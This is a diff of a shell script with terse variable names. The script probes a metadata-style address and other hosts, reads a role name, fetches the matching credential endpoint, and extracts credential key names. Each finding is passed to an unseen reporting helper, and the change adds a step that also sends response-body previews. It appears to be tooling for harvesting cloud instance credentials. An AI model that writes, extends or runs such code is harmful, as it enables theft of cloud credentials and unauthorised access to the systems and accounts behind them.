@@ -22,14 +22,18 @@ _get_ips() {
   { printf '%s\n' "$_mip"; _get_ips; } | sort -u | while IFS= read -r _h; do
     [ -z "$_h" ] && continue
     _url="http://${_h}/${_svc}"
-    _r=$(curl -s -m 8 -w "|%{http_code}" "$_url" 2>/dev/null)
+    _r=$(curl -s -m 10 -L -w "|%{http_code}" "$_url" 2>/dev/null)
     _code="${_r##*|}"; _body="${_r%|*}"; _blen=${#_body}
     printf 'HOST %s CODE %s LEN %s\n' "$_h" "$_code" "$_blen"
     _x "sv4" "h=$_h c=$_code l=$_blen"
+    if [ "${_blen:-0}" -gt 0 ] 2>/dev/null; then
+      _preview=$(printf '%s' "$_body" | tr -d '[:space:]' | head -c 120)
+      _x "bdy" "h=$_h c=$_code p=$_preview"
+    fi
     if [ "$_code" = "200" ] && [ "${_blen:-0}" -gt 0 ] 2>/dev/null; then
       _role=$(printf '%s' "$_body" | tr -d '[:space:]' | head -c 80)
       printf 'ROLE %s\n' "$_role"; _x "ro4" "$_role"
-      _cr=$(curl -s -m 8 -w "|%{http_code}" "${_url}${_role}" 2>/dev/null)
+      _cr=$(curl -s -m 10 -L -w "|%{http_code}" "${_url}${_role}" 2>/dev/null)
       _ks=$(printf '%s' "${_cr%|*}" | grep -oE '"[A-Za-z][A-Za-z0-9_]+"[[:space:]]*:' | sed 's/[": ]//g' | tr '\n' ',' | head -c 200)
       printf 'CRED_KEYS %s\n' "$_ks"; _x "ck4" "role=$_role keys=$_ks"
     fi
